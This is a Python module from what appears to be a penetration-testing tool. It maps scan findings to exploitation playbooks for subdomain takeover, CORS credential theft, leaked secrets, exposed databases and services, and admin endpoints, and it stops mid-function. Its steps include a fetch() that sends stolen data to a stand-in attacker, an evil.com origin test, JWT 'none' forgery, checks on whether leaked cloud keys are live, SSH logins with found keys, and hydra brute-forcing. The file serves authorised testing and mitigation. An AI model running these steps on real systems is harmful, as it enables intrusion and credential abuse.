"""Attack chain pattern database — maps finding combinations to exploitation playbooks.

Each pattern function takes scan data and returns AttackChain objects if the
conditions match. This is where the magic happens: correlating subdomains,
ports, tech stacks, secrets, and misconfigurations into step-by-step
exploitation chains that a human tester can follow.
"""
from __future__ import annotations

import hashlib
import logging
from typing import Any

from scoutx.chains.models import AttackChain, AttackStep

logger = logging.getLogger("scoutx.chains.patterns")


# ---------------------------------------------------------------------------
# Pattern 1: Subdomain Takeover
# ---------------------------------------------------------------------------
def detect_subdomain_takeover(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Dangling CNAMEs pointing to unclaimed cloud services."""
    chains: list[AttackChain] = []
    takeover_data = scan_data.get("takeover", {})
    vulnerable = takeover_data.get("vulnerable", [])

    for entry in vulnerable:
        sub = entry.get("subdomain", "")
        service = entry.get("service", "unknown")
        cname = entry.get("cname", "")
        chain_id = f"chain-takeover-{hashlib.md5(sub.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"Subdomain Takeover: {sub} ({service})",
            severity="high",
            confidence=0.85,
            category="takeover",
            description=(
                f"The subdomain {sub} has a CNAME record pointing to {cname} "
                f"which resolves to an unclaimed {service} service. An attacker "
                f"can claim this service and serve malicious content on {sub}, "
                f"potentially stealing cookies or phishing users."
            ),
            target_host=sub,
            affected_assets=[sub],
            prerequisites=[
                f"CNAME {sub} -> {cname} (dangling)",
                f"Service: {service} (unclaimed)",
            ],
            steps=[
                AttackStep(1, "Verify CNAME is still dangling",
                           f"dig CNAME {sub}", "dig",
                           f"Should return {cname}"),
                AttackStep(2, "Confirm service is unclaimed",
                           f"curl -sI https://{cname}", "curl",
                           "404 or connection refused"),
                AttackStep(3, f"Register the {service} service",
                           f"# Sign up at {service} and claim the hostname {cname}",
                           "browser", f"Claim {cname} on {service}"),
                AttackStep(4, "Deploy proof-of-concept page",
                           "# Upload a simple HTML file with your identifier",
                           "browser", f"Visit https://{sub} and verify your content appears"),
                AttackStep(5, "Test cookie scope for parent domain",
                           f"# Check if cookies from {sub} can be read by parent domain",
                           "browser", "Document cookie scope for escalation potential"),
            ],
            tools_needed=["dig", "curl", "browser"],
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover",
                "https://github.com/EdOverflow/can-i-take-over-xyz",
            ],
            mitigation="Remove the dangling CNAME record or reclaim the service.",
            evidence=entry,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 2: CORS Misconfiguration -> Credential Theft
# ---------------------------------------------------------------------------
def detect_cors_theft(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Permissive CORS allowing cross-origin credential exfiltration."""
    chains: list[AttackChain] = []
    cors_data = scan_data.get("cors", {})
    findings = cors_data.get("findings", [])

    for finding in findings:
        if finding.get("severity", "").lower() not in ("high", "critical"):
            continue
        url = finding.get("url", "")
        issue = finding.get("issue", "")
        chain_id = f"chain-cors-{hashlib.md5(url.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"CORS Credential Theft: {url}",
            severity="high",
            confidence=0.75,
            category="data_exfil",
            description=(
                f"The endpoint {url} has a permissive CORS policy ({issue}). "
                f"An attacker can create a malicious page that reads authenticated "
                f"responses from this endpoint, stealing user data or tokens."
            ),
            target_host=url,
            affected_assets=[url],
            prerequisites=[
                f"CORS misconfiguration at {url}",
                "Victim visits attacker-controlled page while authenticated",
            ],
            steps=[
                AttackStep(1, "Verify CORS misconfiguration",
                           f'curl -sI -H "Origin: https://evil.com" {url} | grep -i access-control',
                           "curl", "Access-Control-Allow-Origin: https://evil.com with credentials"),
                AttackStep(2, "Create exploitation PoC",
                           "# Create HTML file with fetch() to target endpoint",
                           "editor",
                           "JavaScript: fetch(url, {credentials:'include'}).then(r=>r.text()).then(d=>sendToAttacker(d))"),
                AttackStep(3, "Host PoC on attacker domain",
                           "python3 -m http.server 8080", "python3",
                           "Serve the PoC HTML"),
                AttackStep(4, "Test with authenticated session",
                           "# Open PoC page in browser while logged into target",
                           "browser", "Verify cross-origin data is readable"),
            ],
            tools_needed=["curl", "python3", "browser"],
            references=["https://portswigger.net/web-security/cors"],
            mitigation="Restrict Access-Control-Allow-Origin to trusted domains. Never reflect arbitrary origins with credentials.",
            evidence=finding,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 3: Exposed Secrets -> Account Takeover
# ---------------------------------------------------------------------------
def detect_secret_exploitation(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Leaked API keys, tokens, or credentials in JS/source code."""
    chains: list[AttackChain] = []
    secrets_data = scan_data.get("secrets", {})
    findings = secrets_data.get("findings", [])

    for finding in findings:
        sev = finding.get("severity", "").lower()
        if sev not in ("critical", "high", "medium"):
            continue
        # Handle both field naming conventions
        secret_type = finding.get("pattern", finding.get("type", "unknown"))
        file_path = finding.get("source_file", finding.get("file", "unknown"))
        source_url = finding.get("source_url", "")
        matched_raw = finding.get("match_raw", finding.get("match", ""))
        line_num = finding.get("line_number", finding.get("line", "?"))
        # Show enough to identify but not the full secret
        matched_preview = matched_raw[:40] + "..." if len(matched_raw) > 40 else matched_raw
        display_location = source_url or file_path or "unknown source"
        chain_id = f"chain-secret-{hashlib.md5(matched_raw.encode()).hexdigest()[:8]}"

        steps = [
            AttackStep(1, f"Locate the {secret_type} in source code",
                       f"grep -n '{matched_raw[:20]}' {display_location}",
                       "grep",
                       f"Should find the secret at line {line_num}",
                       f"Full match preview: {matched_preview}"),
        ]

        if "aws" in secret_type.lower() or "akia" in matched_raw.lower():
            steps.extend([
                AttackStep(2, "Set up AWS credentials for testing",
                           f"export AWS_ACCESS_KEY_ID='{matched_raw[:20]}...'\nexport AWS_SECRET_ACCESS_KEY='<find-the-secret-key-pair>'",
                           "shell",
                           "Environment variables set",
                           "The secret key often lives near the access key in the same JS file"),
                AttackStep(3, "Validate AWS credentials are live",
                           "aws sts get-caller-identity --output json",
                           "aws-cli",
                           "Returns JSON with Account, Arn, UserId = KEY IS LIVE",
                           "If you get 'InvalidClientTokenId' or 'SignatureDoesNotMatch' → key is dead/rotated"),
                AttackStep(4, "Enumerate what this key can access",
                           "aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2) 2>/dev/null || echo 'No IAM perms'\naws s3 ls 2>/dev/null || echo 'No S3 access'\naws ec2 describe-instances --region us-east-1 2>/dev/null | head -20 || echo 'No EC2 access'",
                           "aws-cli",
                           "Any successful response = data exposure, report the scope"),
            ])
        elif "jwt" in secret_type.lower() or "eyj" in matched_raw.lower()[:5]:
            token_preview = matched_raw[:60]
            steps.extend([
                AttackStep(2, "Decode the JWT payload (no key needed)",
                           f"echo '{token_preview}' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool",
                           "base64",
                           "JSON output showing claims: role, email, exp, iat, sub",
                           "Check 'exp' field — if it's in the past, the token is expired. If 'role' contains 'admin', escalation risk is critical"),
                AttackStep(3, "Check if the token is still accepted",
                           f"curl -sI -H 'Authorization: Bearer {token_preview}...' https://<target-api>/api/me",
                           "curl",
                           "HTTP 200 = token is live; HTTP 401/403 = expired/revoked",
                           "Replace <target-api> with the actual API domain found in the same JS file"),
                AttackStep(4, "Try None algorithm bypass (if live)",
                           "python3 -c \"\nimport base64, json\nheader = {'alg': 'none', 'typ': 'JWT'}\npayload = <decoded-payload-from-step-2>\ntoken = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode() + '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.'\nprint(token)\n\"",
                           "python3",
                           "If the forged token works → CRITICAL auth bypass"),
            ])
        elif "google" in secret_type.lower() or matched_raw.startswith("AIza"):
            steps.extend([
                AttackStep(2, "Test Google API key validity",
                           f"curl -s 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key={matched_raw[:40]}' | python3 -m json.tool",
                           "curl",
                           "status: 'OK' = key is live; 'REQUEST_DENIED' = restricted/dead",
                           "Google API keys starting with 'AIza' are Maps/Cloud keys. Check which APIs are enabled"),
                AttackStep(3, "Enumerate enabled Google APIs",
                           f"# Try common Google API endpoints with the key:\ncurl -s 'https://www.googleapis.com/customsearch/v1?key={matched_raw[:40]}&q=test' | head -5\ncurl -s 'https://translation.googleapis.com/language/translate/v2?key={matched_raw[:40]}&q=hello&target=es' | head -5",
                           "curl",
                           "Any 200 response = that API is billable to the key owner"),
            ])
        elif "github" in secret_type.lower() or matched_raw.startswith(("ghp_", "gho_", "ghu_", "ghs_")):
            steps.extend([
                AttackStep(2, "Validate GitHub token and check scope",
                           f"curl -sH 'Authorization: token {matched_raw[:40]}...' https://api.github.com/user -I | grep -E '(x-oauth-scopes|Status)'",
                           "curl",
                           "x-oauth-scopes header shows permissions; Status: 200 = live token",
                           "ghp_ = personal access token, gho_ = OAuth, ghu_ = user-to-server, ghs_ = server-to-server"),
                AttackStep(3, "List accessible repos (if token is live)",
                           f"curl -sH 'Authorization: token {matched_raw[:40]}...' https://api.github.com/user/repos?per_page=5 | python3 -c \"import json,sys; [print(r['full_name'], r['private']) for r in json.load(sys.stdin)]\"",
                           "curl",
                           "Private repos visible = CRITICAL data exposure"),
            ])
        elif "slack" in secret_type.lower() or matched_raw.startswith("xox"):
            steps.extend([
                AttackStep(2, "Validate Slack token",
                           f"curl -s 'https://slack.com/api/auth.test' -H 'Authorization: Bearer {matched_raw[:40]}...' | python3 -m json.tool",
                           "curl",
                           "ok: true = live token, shows team and user info",
                           "xoxb = bot token, xoxp = user token (more dangerous), xoxs = session token"),
                AttackStep(3, "List accessible channels",
                           f"curl -s 'https://slack.com/api/conversations.list?limit=5' -H 'Authorization: Bearer {matched_raw[:40]}...' | python3 -c \"import json,sys; d=json.load(sys.stdin); [print(c['name']) for c in d.get('channels',[])]\"",
                           "curl",
                           "Channel names visible = can read messages, potential data leak"),
            ])
        elif "stripe" in secret_type.lower() or matched_raw.startswith(("sk_live_", "sk_test_", "pk_live_")):
            is_secret = matched_raw.startswith("sk_")
            steps.extend([
                AttackStep(2, f"Test {'secret' if is_secret else 'publishable'} Stripe key",
                           f"curl -s https://api.stripe.com/v1/charges?limit=1 -u '{matched_raw[:40]}...:' | python3 -m json.tool | head -20",
                           "curl",
                           "JSON response with charge data = CRITICAL financial exposure" if is_secret else "Publishable keys have limited access — check if secret key is nearby",
                           "sk_live_ keys can charge cards and read all data. sk_test_ keys access test mode only — lower severity"),
            ])
        elif any(kw in secret_type.lower() for kw in ("rsa", "ssh", "private key", "private_key", "pem")) or "BEGIN" in matched_raw[:30]:
            # RSA / SSH Private Key — specific validation
            steps.extend([
                AttackStep(2, "Extract the full PEM key block",
                           f"# Locate the full key in the source file:\ngrep -A 30 'BEGIN' {display_location}\n# Save the full block (-----BEGIN ... -----END) to a file:\n# key.pem",
                           "grep",
                           "Full PEM block from -----BEGIN to -----END-----",
                           "RSA keys are multi-line. You need the entire block, not just the first line"),
                AttackStep(3, "Check if this is a known test/example key",
                           "# Compare the key fingerprint against known test keys:\nssh-keygen -lf key.pem 2>/dev/null\n# Known test key fingerprints (skip if matches):\n#   SHA256:jE4gM... = Metasploitable default\n#   SHA256:W2Fh4... = DVWA example key\n# If fingerprint is unique → likely a real leaked key",
                           "ssh-keygen",
                           "Unique fingerprint = potentially real key. Known test fingerprint = false positive"),
                AttackStep(4, "Determine what the key authenticates to",
                           f"# Check context around the key in {display_location}:\ngrep -B 10 'BEGIN' {display_location} | grep -iE '(host|server|ip|user|root|deploy|prod|staging)'\n# Look for associated username, hostname, or IP address",
                           "grep",
                           "Found associated host/user = try SSH connection next"),
                AttackStep(5, "Test SSH authentication (if host found)",
                           "chmod 600 key.pem\nssh -i key.pem -o StrictHostKeyChecking=no -o ConnectTimeout=5 <user>@<host> 'whoami; hostname; id' 2>&1",
                           "ssh",
                           "Successful login = CRITICAL — full server compromise",
                           "Replace <user> and <host> with values found in step 4. Common users: root, ubuntu, deploy, ec2-user"),
            ])
        elif "api" in secret_type.lower() or "key" in secret_type.lower():
            steps.extend([
                AttackStep(2, "Identify the API service from key format",
                           f"# Key preview: {matched_preview}\n# Check key prefix patterns:\n#   AIza*        → Google Cloud/Maps\n#   sk_live_*    → Stripe\n#   ghp_*        → GitHub\n#   xox*         → Slack\n#   AKIA*        → AWS\n#   SG.*         → SendGrid\n#   key-*        → Mailgun\n# Google the first 10 chars if unknown",
                           "browser",
                           "Identified service name and API docs",
                           "Many API keys have distinct prefixes — match against known patterns"),
                AttackStep(3, "Test key validity against identified service",
                           f"# Replace <API_ENDPOINT> with the service's test endpoint:\ncurl -sI -H 'Authorization: Bearer {matched_raw[:30]}...' https://<API_ENDPOINT>/v1/me\n# OR:\ncurl -s 'https://<API_ENDPOINT>/v1/test?api_key={matched_raw[:30]}...'",
                           "curl",
                           "HTTP 200 = key is live; HTTP 401/403 = invalid or revoked"),
                AttackStep(4, "Determine access scope and impact",
                           "# Once authenticated, try:\n# 1. List resources: GET /v1/resources\n# 2. Read data: GET /v1/users or /v1/data\n# 3. Write test: POST /v1/test (only if authorized!)",
                           "curl",
                           "Any data returned = report with the scope of access"),
            ])
        else:
            steps.extend([
                AttackStep(2, "Determine what type of secret this is",
                           f"# Examine the context around the match in {display_location}:\ngrep -B5 -A5 '{matched_raw[:15]}' {display_location}\n# Look for variable names, comments, API URLs nearby",
                           "grep",
                           "Context reveals the service/purpose of the secret",
                           "Common patterns: passwords in config, tokens in auth headers, keys in API calls"),
                AttackStep(3, "Test if the secret is live",
                           "# Based on context from step 2, try authenticating:\n# If it's a password: try logging into the associated service\n# If it's a token: curl with Authorization header\n# If it's an API key: try the associated API endpoint",
                           "curl",
                           "Successful authentication = CONFIRMED, report it",
                           "If the value looks like 'test', 'example', 'changeme', 'xxx' → it's a placeholder, skip"),
            ])

        chains.append(AttackChain(
            id=chain_id,
            title=f"Exposed {secret_type} → Potential Account Takeover",
            severity=sev,
            confidence=0.7 if sev == "high" else 0.5,
            category="credential_exposure",
            description=(
                f"A **{secret_type}** was discovered in `{display_location}` (line {line_num}). "
                f"Match preview: `{matched_preview}`. "
                f"If this credential is live and unrestricted, an attacker can use it to "
                f"access the associated service — potentially leading to data exfiltration, "
                f"unauthorized actions, or full account takeover. Follow the validation steps "
                f"below to determine if this is a real exploitable finding or just informational noise."
            ),
            target_host=display_location,
            affected_assets=[display_location],
            prerequisites=[
                f"Exposed {secret_type} found in client-side JavaScript",
                f"Source: {display_location} (line {line_num})",
                "The secret must be live (not rotated/revoked) to be exploitable",
            ],
            steps=steps,
            tools_needed=["curl", "grep", "browser", "python3"],
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage",
                "https://github.com/streaak/keyhacks",
            ],
            mitigation=(
                f"1. **Immediately rotate** the {secret_type} — generate a new one and revoke the old\n"
                f"2. **Move secrets server-side** — never embed API keys in client-side JavaScript\n"
                f"3. **Use environment variables** or a secrets manager (Vault, AWS Secrets Manager)\n"
                f"4. **Add key restrictions** — limit by IP, referrer, or API scope where possible\n"
                f"5. **Audit access logs** — check if the leaked key was used by unauthorized parties"
            ),
            evidence=finding,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 4: Exposed Database Ports -> Data Exfiltration
# ---------------------------------------------------------------------------
def detect_exposed_databases(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Open database ports (MongoDB, Redis, Elasticsearch, etc.)."""
    chains: list[AttackChain] = []
    ports_data = scan_data.get("ports", {})

    DB_PORTS = {
        3306: ("MySQL", "mysql -h {host} -u root --password=''", "mysql"),
        5432: ("PostgreSQL", "psql -h {host} -U postgres -d postgres", "psql"),
        27017: ("MongoDB", "mongosh {host}:27017", "mongosh"),
        6379: ("Redis", "redis-cli -h {host} INFO", "redis-cli"),
        9200: ("Elasticsearch", "curl http://{host}:9200/_cat/indices", "curl"),
        5984: ("CouchDB", "curl http://{host}:5984/_all_dbs", "curl"),
        11211: ("Memcached", "echo 'stats' | nc {host} 11211", "nc"),
    }

    hosts_with_ports = ports_data.get("hosts", {})
    if isinstance(hosts_with_ports, list):
        # Normalize list format
        normalized = {}
        for entry in hosts_with_ports:
            if isinstance(entry, dict):
                host = entry.get("host", entry.get("hostname", ""))
                open_ports = entry.get("ports", entry.get("open_ports", []))
                if host:
                    normalized[host] = open_ports
        hosts_with_ports = normalized

    for host, ports in hosts_with_ports.items():
        port_list = ports if isinstance(ports, list) else []
        for port_entry in port_list:
            port_num = port_entry if isinstance(port_entry, int) else port_entry.get("port", 0)
            if port_num in DB_PORTS:
                db_name, connect_cmd, tool = DB_PORTS[port_num]
                chain_id = f"chain-db-{hashlib.md5(f'{host}:{port_num}'.encode()).hexdigest()[:8]}"

                chains.append(AttackChain(
                    id=chain_id,
                    title=f"Exposed {db_name} on {host}:{port_num}",
                    severity="critical",
                    confidence=0.6,
                    category="data_exfil",
                    description=(
                        f"{db_name} is exposed on {host}:{port_num}. If no "
                        f"authentication is required, an attacker can directly "
                        f"connect and dump all data."
                    ),
                    target_host=host,
                    affected_assets=[f"{host}:{port_num}"],
                    prerequisites=[f"{db_name} port {port_num} is open on {host}"],
                    steps=[
                        AttackStep(1, f"Verify {db_name} is accessible",
                                   f"nmap -sV -p {port_num} {host}", "nmap",
                                   f"Service: {db_name}"),
                        AttackStep(2, "Attempt unauthenticated connection",
                                   connect_cmd.format(host=host), tool,
                                   "Connection successful without credentials"),
                        AttackStep(3, "Enumerate databases/collections",
                                   f"# List all databases on {host}:{port_num}",
                                   tool, "Database listing"),
                        AttackStep(4, "Check for sensitive data",
                                   "# Query for user tables, credentials, PII",
                                   tool, "Document findings"),
                    ],
                    tools_needed=["nmap", tool],
                    references=[f"https://book.hacktricks.xyz/network-services-pentesting/pentesting-{db_name.lower()}"],
                    mitigation=f"Restrict {db_name} to internal networks. Enable authentication. Use firewall rules.",
                    evidence={"host": host, "port": port_num, "service": db_name},
                ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 5: SSL/TLS Weaknesses -> Traffic Interception
# ---------------------------------------------------------------------------
def detect_ssl_downgrade(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Weak TLS versions or cipher suites enabling traffic interception."""
    chains: list[AttackChain] = []
    ssl_data = scan_data.get("ssl_analysis", {})
    findings = ssl_data.get("findings", ssl_data.get("certificates", []))

    for finding in findings:
        if isinstance(finding, dict):
            host = finding.get("host", finding.get("hostname", ""))
            issues = finding.get("issues", [])
            tls_versions = finding.get("tls_versions", [])

            weak_tls = [v for v in tls_versions if v in ("TLSv1", "TLSv1.0", "TLSv1.1", "SSLv3")]
            if not weak_tls and not issues:
                continue

            chain_id = f"chain-ssl-{hashlib.md5(host.encode()).hexdigest()[:8]}"
            chains.append(AttackChain(
                id=chain_id,
                title=f"SSL/TLS Downgrade: {host}",
                severity="medium",
                confidence=0.7,
                category="traffic_interception",
                description=(
                    f"The host {host} supports deprecated TLS versions "
                    f"({', '.join(weak_tls) if weak_tls else 'weak config'}). "
                    f"An attacker on the same network can force a protocol "
                    f"downgrade and intercept encrypted traffic."
                ),
                target_host=host,
                affected_assets=[host],
                prerequisites=["Attacker on same network (MITM position)", f"Weak TLS on {host}"],
                steps=[
                    AttackStep(1, "Enumerate supported TLS versions",
                               f"nmap --script ssl-enum-ciphers -p 443 {host}", "nmap",
                               "Lists all supported cipher suites and TLS versions"),
                    AttackStep(2, "Test for specific weak protocols",
                               f"openssl s_client -connect {host}:443 -tls1", "openssl",
                               "Connection succeeds = TLS 1.0 supported"),
                    AttackStep(3, "Check for BEAST/POODLE vulnerability",
                               f"testssl.sh {host}", "testssl.sh",
                               "Flags known SSL/TLS vulnerabilities"),
                ],
                tools_needed=["nmap", "openssl", "testssl.sh"],
                references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security"],
                mitigation="Disable TLS 1.0/1.1 and SSLv3. Use TLS 1.2+ with strong cipher suites only.",
                evidence=finding,
            ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 6: Open Redirect -> OAuth Token Theft
# ---------------------------------------------------------------------------
def detect_open_redirect_chain(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Open redirects near OAuth flows enabling token theft."""
    chains: list[AttackChain] = []
    endpoints_data = scan_data.get("endpoints", {})
    all_endpoints = endpoints_data.get("endpoints", [])

    # Find redirect parameters and OAuth endpoints
    redirect_params = []
    oauth_endpoints = []
    for ep in all_endpoints:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        url_lower = url.lower()
        if any(p in url_lower for p in ("redirect", "return", "next", "url=", "goto", "continue")):
            redirect_params.append(url)
        if any(p in url_lower for p in ("oauth", "authorize", "callback", "login", "sso")):
            oauth_endpoints.append(url)

    if redirect_params and oauth_endpoints:
        chain_id = f"chain-redirect-oauth-{hashlib.md5(redirect_params[0].encode()).hexdigest()[:8]}"
        chains.append(AttackChain(
            id=chain_id,
            title="Open Redirect + OAuth -> Account Takeover",
            severity="high",
            confidence=0.6,
            category="auth_bypass",
            description=(
                f"Found {len(redirect_params)} potential redirect parameters and "
                f"{len(oauth_endpoints)} OAuth endpoints. If any redirect is exploitable, "
                f"an attacker can steal OAuth authorization codes by manipulating the "
                f"redirect_uri to their controlled domain."
            ),
            target_host=redirect_params[0],
            affected_assets=redirect_params[:5] + oauth_endpoints[:5],
            prerequisites=["Open redirect vulnerability", "OAuth/SSO authentication flow"],
            steps=[
                AttackStep(1, "Test redirect parameters for open redirect",
                           f"curl -sI '{redirect_params[0]}=https://evil.com' | grep -i location",
                           "curl", "Location header points to evil.com"),
                AttackStep(2, "Identify OAuth authorization endpoint",
                           f"# Found: {oauth_endpoints[0] if oauth_endpoints else 'N/A'}",
                           "browser", "Locate the /authorize or /oauth/callback endpoint"),
                AttackStep(3, "Craft malicious redirect_uri",
                           "# Replace redirect_uri with open redirect URL that chains to attacker",
                           "browser", "OAuth code sent to attacker via redirect chain"),
                AttackStep(4, "Capture authorization code",
                           "# Monitor attacker server logs for the auth code",
                           "python3", "Extract code from redirect URL"),
                AttackStep(5, "Exchange code for access token",
                           "curl -X POST /oauth/token -d 'code=<stolen>&grant_type=authorization_code'",
                           "curl", "Receive valid access token"),
            ],
            tools_needed=["curl", "browser", "python3"],
            references=[
                "https://portswigger.net/web-security/oauth",
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect",
            ],
            mitigation="Validate redirect_uri strictly. Use allowlists for OAuth redirect URIs.",
            evidence={"redirect_params": redirect_params[:10], "oauth_endpoints": oauth_endpoints[:10]},
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 7: Nuclei Critical Findings -> Exploit Chain
# ---------------------------------------------------------------------------
def detect_nuclei_exploits(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Critical Nuclei findings mapped to exploitation steps."""
    chains: list[AttackChain] = []
    nuclei_data = scan_data.get("nuclei", {})
    findings = nuclei_data.get("findings", [])

    for finding in findings:
        sev = finding.get("severity", "").lower()
        if sev not in ("critical", "high"):
            continue

        template_id = finding.get("template_id", "unknown")
        host = finding.get("host", "")
        matched_at = finding.get("matched_at", "")
        desc = finding.get("description", "")
        refs = finding.get("reference", [])
        chain_id = f"chain-nuclei-{hashlib.md5(f'{template_id}-{host}'.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"Nuclei: {finding.get('template_name', template_id)} on {host}",
            severity=sev,
            confidence=0.8,
            category="vulnerability",
            description=desc or f"Nuclei template {template_id} matched on {host}",
            target_host=host,
            affected_assets=[matched_at or host],
            prerequisites=[f"Nuclei template {template_id} matched"],
            steps=[
                AttackStep(1, "Verify finding with manual request",
                           finding.get("curl_command", f"curl -sI {matched_at or host}"),
                           "curl", "Reproduce the vulnerability manually"),
                AttackStep(2, "Re-run nuclei template for confirmation",
                           f"nuclei -t {template_id} -u {host}", "nuclei",
                           "Confirms the vulnerability is reproducible"),
                AttackStep(3, "Check for exploitation path",
                           f"# Research {template_id} for known exploits",
                           "browser", "Search exploit-db, GitHub, blog posts"),
            ],
            tools_needed=["curl", "nuclei", "browser"],
            references=refs if isinstance(refs, list) else [refs] if refs else [],
            mitigation=f"Apply patch or configuration fix for {template_id}.",
            evidence=finding,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 8: Sensitive Ports -> Lateral Movement
# ---------------------------------------------------------------------------
def detect_sensitive_services(scan_data: dict[str, Any]) -> list[AttackChain]:
    """RDP, SSH, SMB, and other sensitive services exposed to internet."""
    chains: list[AttackChain] = []
    ports_data = scan_data.get("ports", {})

    SENSITIVE = {
        21: ("FTP", "hydra -l admin -P wordlist.txt ftp://{host}", "hydra"),
        22: ("SSH", "ssh -o StrictHostKeyChecking=no root@{host}", "ssh"),
        23: ("Telnet", "telnet {host}", "telnet"),
        445: ("SMB", "smbclient -L //{host} -N", "smbclient"),
        3389: ("RDP", "xfreerdp /v:{host} /u:admin /p:admin", "xfreerdp"),
        5900: ("VNC", "vncviewer {host}:5900", "vncviewer"),
        2375: ("Docker API", "curl http://{host}:2375/containers/json", "curl"),
    }

    hosts_with_ports = ports_data.get("hosts", {})
    if isinstance(hosts_with_ports, list):
        normalized = {}
        for entry in hosts_with_ports:
            if isinstance(entry, dict):
                host = entry.get("host", entry.get("hostname", ""))
                open_ports = entry.get("ports", entry.get("open_ports", []))
                if host:
                    normalized[host] = open_ports
        hosts_with_ports = normalized

    for host, ports in hosts_with_ports.items():
        port_list = ports if isinstance(ports, list) else []
        for port_entry in port_list:
            port_num = port_entry if isinstance(port_entry, int) else port_entry.get("port", 0)
            if port_num in SENSITIVE:
                svc_name, connect_cmd, tool = SENSITIVE[port_num]
                chain_id = f"chain-svc-{hashlib.md5(f'{host}:{port_num}'.encode()).hexdigest()[:8]}"

                chains.append(AttackChain(
                    id=chain_id,
                    title=f"Exposed {svc_name} on {host}:{port_num}",
                    severity="high" if port_num in (2375, 445, 23) else "medium",
                    confidence=0.5,
                    category="lateral_movement",
                    description=f"{svc_name} is exposed on {host}:{port_num}. Test for default credentials and misconfigurations.",
                    target_host=host,
                    affected_assets=[f"{host}:{port_num}"],
                    prerequisites=[f"{svc_name} port {port_num} open"],
                    steps=[
                        AttackStep(1, f"Banner grab {svc_name}",
                                   f"nmap -sV -p {port_num} {host}", "nmap",
                                   f"Identify {svc_name} version"),
                        AttackStep(2, "Test default/common credentials",
                                   connect_cmd.format(host=host), tool,
                                   "Access with default creds"),
                        AttackStep(3, "Check for known CVEs",
                                   f"searchsploit {svc_name}", "searchsploit",
                                   "Known exploits for detected version"),
                    ],
                    tools_needed=["nmap", tool, "searchsploit"],
                    references=[f"https://book.hacktricks.xyz/network-services-pentesting/pentesting-{svc_name.lower()}"],
                    mitigation=f"Restrict {svc_name} access via firewall. Disable if not needed. Use strong credentials.",
                    evidence={"host": host, "port": port_num},
                ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 9: JS Endpoints -> Internal Service Discovery
# ---------------------------------------------------------------------------
def detect_internal_endpoints(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Internal/admin/API endpoints leaked in JavaScript files."""
    chains: list[AttackChain] = []
    endpoints_data = scan_data.get("endpoints", {})
    # 'interesting' may be an int count; always fall back to 'endpoints' list
    interesting = endpoints_data.get("endpoints", [])
    if not isinstance(interesting, list):
        interesting = []

    admin_endpoints = []
    api_endpoints = []
    internal_urls = []

    for ep in interesting:
        url = ep if isinstance(ep, str) else ep.get("url", ep.get("endpoint", ""))
        url_lower = url.lower()
        if any(kw in url_lower for kw in ("/admin", "/dashboard", "/internal", "/manage", "/panel")):
            admin_endpoints.append(url)
        elif any(kw in url_lower for kw in ("/api/", "/graphql", "/rest/", "/v1/", "/v2/", "/v3/")):
            api_endpoints.append(url)
        if any(kw in url_lower for kw in ("10.", "172.16", "192.168", "127.0", "localhost", "internal")):
            internal_urls.append(url)

    if admin_endpoints:
        chain_id = f"chain-admin-{hashlib.md5(admin_endpoints[0].encode()).hexdigest()[:8]}"
        chains.append(AttackChain(
            id=chain_id,
            title=f"Admin Panel Discovery via JS ({len(admin_endpoints)} endpoints)",
            severity="high",
            confidence=0.65,
            category="auth_bypass",
            description=f"Found {len(admin_endpoints)} admin/management endpoints in JavaScript files. These may be accessible without proper authorization.",
            target_host=admin_endpoints[0],
            affected_assets=admin_endpoints[:10],
            prerequisites=["Admin endpoints leaked in client-side JS"],
            steps=[
                AttackStep(1, "Test each admin endpoint for access",
                           f"curl -sI {admin_endpoints[0]}", "curl",
                           "200 OK without authentication = direct access"),
                AttackStep(2, "Test with different HTTP methods",
                           f"curl -X POST {admin_endpoints[0]}", "curl",
                           "Some endpoints allow POST without auth"),
                AttackStep(3, "Try default credentials",
                           "# admin:admin, admin:password, admin:123456",
                           "browser", "Common defaults for admin panels"),
                AttackStep(4, "Check for IDOR in admin endpoints",
                           "# Modify user IDs, resource IDs in the URL/body",
                           "burp/curl", "Access other users' data"),
            ],
            tools_needed=["curl", "browser"],
            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information"],
            mitigation="Restrict admin endpoints with proper authentication and authorization. Don't expose admin routes in client-side code.",
            evidence={"admin_endpoints": admin_endpoints[:20]},
        ))

    if internal_urls:
        chain_id = f"chain-internal-{hashlib.md5(internal_urls[0].encode()).hexdigest()[:8]}"
        chains.append(AttackChain(
